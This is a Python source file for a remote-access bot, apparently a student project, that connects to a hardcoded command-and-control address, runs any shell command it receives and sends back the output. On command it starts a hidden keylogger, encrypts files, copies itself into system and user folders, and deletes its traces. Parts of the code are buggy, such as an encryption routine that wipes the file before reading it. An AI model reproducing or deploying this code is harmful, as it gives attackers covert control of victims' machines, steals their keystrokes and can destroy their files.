#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket # Import socket for creating TCP connection.
	from subprocess import PIPE, run # Import subprocess to execute system commands.
	import os # Import os for devnull, remove, mkdir, chdir
	from sys import exit # Import exit from sys to quit program when specified.
	from platform import system # Import system from platform to detect os.
	from pynput import keyboard # Import keyboard to perform keylogger operations.
	from threading import Timer, Thread # Import Timer to create thread that'll run every 20s.
	from cryptography.fernet import Fernet # Import Fernet for encryption.
except ImportError as e:
    print(f'Import error: {e}')
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  CONSTANTS  #
FILENAME = __file__[2:] # The name of this file.
SYSTEM = system() # The operating this program is being ran on.
IP = '192.168.31.134' # IP address to connect to.
PORT = 1337 # Port number to create socket with.
LIN_DIR = '/tmp/.folder/' # Hidden Linux folder to create for our keylogger.
WIN_DIR = r'%temp%\.folder\\' # Hideen Windows folder to create for our keylogger.
SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
LOG = '' # Will store the keystrokes of the user.
COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def create_client_socket():
	"""This function creates a client socket to connect to 
		our command & control server.
		Arguments:
			None
		Returns:
			This function will return a socket object.
	"""
	client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Initializing socket.
	ip_port = (IP, PORT) # Tuple containing IP address and port number.
	client_sock.connect(ip_port) # Connecting to server.
	initial_message = system() # Send IP address and OS information.
	client_sock.send(initial_message.encode('utf-8')) # Send message with this host's IP back to the server.
	return client_sock # Return the created client socket.
		
def self_delete():
	"""This function will be invoked when the C&C server enter's the
		keyword "self-destruct" and which will instruct the program to
		delete traces of itself.
		Arguments:
			None
		Returns:
			Confirmation string.
	"""
	fullpath = os.path.abspath(FILENAME) # Full path of the file.
	if SYSTEM == 'Linux': # Check if OS is Linux to perform Linux remove file commands.
		try:
			'''
			Delete all copies of this file from the Linux file
			system.
			'''
			if os.path.isfile('/tmp/' + FILENAME):
				run(['rm', '/tmp/' + FILENAME]) # Attempt to remove files from Linux file system.
			if os.path.isfile('/etc/' + FILENAME):
				run(['rm', '/etc/' + FILENAME]) # ^
			if os.path.isfile('/var/' + FILENAME):
				run(['rm', '/var/' + FILENAME]) # ^
			if os.path.isfile(fullpath):
				run(['rm', fullpath]) # ^
		except:
			return r"Couldnt remove all files..." # Return this if deletion operation fails.
		return r"Deleted all files..." # Returns this if deletion operation is successful.
	else:
		try:
			'''
			Delete all copies of this file from the Windows file
			system.
			'''
			if os.path.isfile('%temp%\\' + FILENAME):
				run([r'del %temp%\\' + FILENAME], shell=True) # Attempt to remove files from Windows file system.
			if os.path.isfile('C:\Users\%username%\\' + FILENAME):
				run([r'del C:\Users\%username%\\' + FILENAME], shell=True) # ^
			if os.path.isfile('C:\Users\%username%\AppData\\' + FILENAME):
				run([r'del C:\Users\%username%\AppData\\' + FILENAME], shell=True) # ^
			if os.path.isfile(fullpath):
				run(r'del' + fullpath, shell=True) # ^
		except:
			return r"  Couldn't remove all files..." # Return this if deletion operation fails.
		return r'  Deleted all files...' # Returns this if deletion operation is successful.

def propagate(name: str):
	"""This function will create other instances of this file in 
		other directories on the victim's machines when the keyword
		"propogate" is used.
		Arguments:
			name (str): The name of this file.
		Returns:
			Confirmation string.
	"""
	if SYSTEM == 'Linux':
		try:
			'''
			Linux: Attempt to copy this file in the
			/tmp, /etc and /var folders.
			'''
			run(['cp', name, '/tmp']) # Using run command to perform bash command for copying file.
			run(['cp', name, '/etc']) # ^
			run(['cp', name, '/var']) # ^
		except:
			return r'  Unable to propagate..." # Return this string if copying operation fails.'
		return r'  File has been cloned to /tmp /etc and /var folders...' # Return this string is we successfully copied files.
	else:
		try:
			'''
			Windows: Attempt to copy this file in the
			user, temp, and appdata folders..
			'''
			run(['copy', name, r'%temp%']) # Using run command to perform cmd.exe command for copying file.
			run(['copy', name, r'C:\Users\%username%\\']) # ^
			run(['copy', name, r'C:\Users\%username%\AppData\\']) # ^
		except:
			return r'  Unable to propagate...' # Return this string if copying operation fails.
		return r'  File has been cloned to temp, C:\Users\[current user]\, and AppData\...' # Return this string is we successfully copied files.

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def on_press(key):
	"""This function will handle all the keystrokes a person types into
	there computer and will store them into a global variable that will
	be used to write to a file containing all keystrokes.
		Arguments:
			key (keyboard obj): holds the keyboard character that was pressed.
		Returns:
			None
	"""
	global LOG
	try:
		LOG += str(key.char) # If key pressed is not a special key, log to file.
	except AttributeError: # Handling error is key is special key.
		if key == key.space: # If key is space, append a space to string.
			LOG += ' '
		elif key == key.enter: LOG += '\n' # If key is enter, append new line to string.
		elif key == key.backspace: LOG += '' # If key is backspace, do not append anything.
		elif key == key.ctrl: LOG += ' ctrl+' # If control key is pressed append string 'ctrl+' followed by key pressed.
		elif key == key.tab: LOG += '\t' # If tab key is pressed, append tab to string.
		elif key == key.cmd: LOG += ' cmd+'
		elif key == key.alt: LOG += ' alt+'
		elif key == key.caps_lock: LOG += ' CapsLock '
		elif key == key.delete: LOG += ' Del '
		elif key == key.down: LOG += ' DownArrow '
		elif key == key.left: LOG += ' LeftArrow '
		elif key == key.up: LOG += ' UpArrow '
		elif key == key.right: LOG += ' RightArrow'
		elif key == key.esc: LOG += ' esc '
		elif key == key.home: LOG += ' HomeKey '
		elif key == key.insert: LOG += ' InsertKey '
		elif key == key.print_screen: LOG += ' PrintScreen '
		elif key == key.shift: LOG += ' shift+'
		elif key == key.f1: LOG += ' F1 '
		elif key == key.f2: LOG += ' F2 '
		elif key == key.f3: LOG += ' F3 '
		elif key == key.f4: LOG += ' F4 '
		elif key == key.f5: LOG += ' F5 '
		elif key == key.f6: LOG += ' F6 '
		elif key == key.f7: LOG += ' F7 '
		elif key == key.f8: LOG += ' F8 '
		elif key == key.f9: LOG += ' F9 '
		elif key == key.f10: LOG += ' F10 '
		elif key == key.f11: LOG += ' F11 '
		elif key == key.f12: LOG += ' F12 '
		else:
			LOG += str(key) # Append any other special key not handled above.

def log_to_file():
	"""This function will log collected keystrokes to a text file in the
	/tmp folder.
		Arguments:
			None
		Returns:
			None
	"""
	if SYSTEM == 'Linux':
		f = open(LIN_DIR + 'log.txt', 'w') # Linux: Create and open file 'log.txt' to write captured keystrokes.
		f.write(LOG) # Write keystrokes to file.
	else:
		f = open(WIN_DIR + 'log.txt', 'w') # Windows: Create and open file 'log.txt' to write captured keystrokes.
		f.write(LOG) # Write keystrokes to file.
	cycle = Timer(SECONDS_TO_LOG, log_to_file) # Set this thread to run every 30 seconds.
	cycle.start() # Start the time threading operaton.

def keylogger():
	"""This function will start a keylogger in the background.
		Arguments:
			None
		Returns:
			Confirmation string.
	"""
	listener = keyboard.Listener(on_press=on_press) # Creating keystrokes listener object in context manager.
	try:
		if SYSTEM == 'Linux':
			os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
		else:
			os.mkdir(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
		log_to_file() # Begin thread for logging to file every 30s.
		listener.start() # Collent keystrokes until program exit.
	except OSError: # Ignore os error.
		pass

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def crypto(action: str, *args):
	"""This function will handle all of our encryption/decryption processes.
		Argument:
			action (str): Will take value of encrypt or decrypt.
			request (list): A list containing file name or file and decryption key if action eq decrypt.
		Returns:
			Confirmation string.
	"""
	if action == 'encrypt':
		to_encrypt = args[0]
		with open(to_encrypt, 'wb+') as f:
			data = f.read()
			key = Fernet.generate_key()
			cipher = Fernet(key)
			cipher_text = cipher.encrypt(data)
			f.seek(0)
			f.write(cipher_text)
			f.truncate()
			return f'  Save the decryption key -> {key.decode()}'
	else:
		to_encrypt, key = args[0][0], args[0][1]
		with open(to_encrypt, 'wb+') as f:
			cipher_text = f.read()
			cipher = Fernet(key)
			try:
				plain_text = cipher.decrypt(cipher_text)
			except cryptography.fernet.InvalidToken:
				return '  [-] Invalid key!'
			f.seek(0)
			f.write(plain_text)
			f.truncate()
			return '  [+] File successfully decrypted!'

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class WindowsBot:
	"""This class definition will contain the functions and commands
		that are specific to the Windows operating system.
	"""
	def __init__(self):
		pass

	def exec_windows_cmd(self, command: str):
		"""This function will execute Windows commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
		try:
			# os.popen('cat /etc/services').read()
			output = run(command, # Run command.
						shell=True, # Perform this command in cmd.exe.
						stdout=PIPE, # Pipe command to store in variable.
						stderr=DEVNULL)	# Send standard error to devnull.
			return output.stdout # Return the stdout property of this subprocess object.
		except:
			try:
				os.chdir(command[3:]) # Attempt to change directory.
				return "Ok" # Returns Ok if changing of directory was successsful.
			except:
				try:
					os.system(command) # Try executing command with OS module.
				except:
					return "[-] Invalid command." # Return this error message if unsuccessful.

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket() # Store socket object.
		try:
			with sock: # Utilizing this socket connection in context manager.
				while True: # Continue to receive commands.
					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
					command_output = '[-] Invalid command.'
					if command.strip() == 'keylog': # Start the keylogger.
						keylogger()
						command_output = 'listening'
					elif command[:7] == 'encrypt': # Encrypt file specified.
						command_output = crypto(command[:7], command[8:])
					elif command[:7] == 'decrypt': # Decrypt file with key.
						command_output = crypto(command[7:], command[8:].strip().split())
					elif command.strip() == 'propagate': # Copy this file to multiple directory.
						command_output = propagate(FILENAME)
					elif command.strip() == 'destory': # Attempt to delete any traces of this file.
						command_output = self_delete()
					else:
						command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
		except:
			exit(1)

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class LinuxBot:
	"""This class definition will contain the functions and commands
		that are specific to the Linux operating system.
	"""
	def __init__(self):
	    pass

	def exec_linux_cmd(self, command: str):
		"""This function will execute Linux commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
		try:
			# os.popen('cat /etc/services').read()
			output = run(command.split(), # Run command.
						stdout=PIPE, # Pipe command to store in variable.
						stderr=DEVNULL)	# Send standard error to devnull.
			return output.stdout # Return the stdout property of this subprocess object.
		except:
			try:
				os.chdir(command[3:]) # Attempt to change directory.
				return 'Ok' # Returns Ok if changing of directory was successsful.
			except:
				try:
					os.system(command) # Try executing command with OS module.
				except:
					return "[-] Invalid command." # Return this error message if unsuccessful.

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket() # Store socket object.
		try:
			with sock: # Utilizing this socket connection in context manager.
				while True: # Continue to receive commands.
					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
					command_output = '[-] Invalid command.'
					if command.strip() == 'keylog': # Start the keylogger.
						keylogger()
						command_output = 'listening'
					elif command[:7] == 'encrypt': # Encrypt file specified.
						command_output = crypto(command[:7], command[8:])
					elif command[:7] == 'decrypt': # Decrypt file with key.
						command_output = crypto(command[7:], command[8:].strip().split())
					elif command.strip() == 'propagate': # Copy this file to multiple directory.
						command_output = propagate(FILENAME)
					elif command.strip() == 'destory': # Attempt to delete any traces of this file.
						command_output = self_delete()
					else:
						command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
		except:
			exit(1)

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	obj = None
	if SYSTEM == 'Linux': # Check if operating system is Linux.
		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
	else:
		obj = WindowsBot() # Else, instantiate WindowsBot object.

	obj.handle_request() # Will invoke function that will handle all socket connection operations.

if __name__ == '__main__':
    main()
